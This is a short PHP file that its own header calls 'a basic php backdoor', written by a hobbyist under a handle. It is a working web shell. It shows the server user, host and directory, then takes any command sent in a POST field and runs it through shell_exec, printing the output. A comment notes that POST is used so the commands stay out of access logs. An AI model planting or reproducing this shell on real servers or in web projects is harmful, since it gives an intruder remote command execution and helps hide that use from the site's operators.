<?php

/*
{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}
>> 2233.php                                                          <<,
>>                                                                   <<,
>> a basic php backdoor i wrote for fun                              <<,
>> don't use this on someone else's server, that's naughty           <<,
>> besides weevely is so much better                                 <<,
>>                                                                   <<,
>> released in full compliance with the zf0 anti-copyright pledge    <<,
>>                                                                   <<,
>> i have no idea what i'm doing with this comment box decorating    <<,
>>                                                                   <<,
>> @reptar_xl                                                        <<,
>> badcunt.club                                                      <<,
{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}
*/

// this is like
// www-data@website.org : /var/www/
$inf0 = shell_exec('echo "$(whoami)@$(hostname) : $(pwd)"');
$thisscript = basename($_SERVER['SCRIPT_NAME']);

// this is just formatting etc, skip this
echo <<< EOF
<!DOCTYPE HTML>
<html>
	<head>
		<style>
			input{ background-color: #fff; width: 50%; } 
			code, input{ font-size: 12px; color:#000; 
			font-family: "Monaco","Consolas", monospace !important; } 
			body{ background-color:#fafafa; } 
			banana{ color: #aaa; }
		</style>
	</head>
	<body>
		$inf0
		<form action="$thisscript" method="POST">
			<input type="text" name="whosthere" autocomplete="off" autofocus>
			<br>
			<button value="Submit" name="submit" type="submit">~$$$$</button>
		</form>
		<code>
			<pre><br><br>
EOF;

//   this is where the fun happens
//   the html element isn't called banana for any reason, basically 
//   just because i can, it's valid html so nyeh
//   POSTs because otherwise you'll leave stuff in the access logs
//   also, note all commands happen 2>&1 to save you from typing it


if (isset($_POST["whosthere"])) {
	$cmd = $_POST["whosthere"];
	echo "<banana>$ ". $cmd ."</banana>\r\n\r\n". shell_exec($cmd." 2>&1");
}

// gotta keep your html all semantic and proper and shit
echo <<< EOF
			</pre>
		</code>
	</body>
</html>
EOF;

?>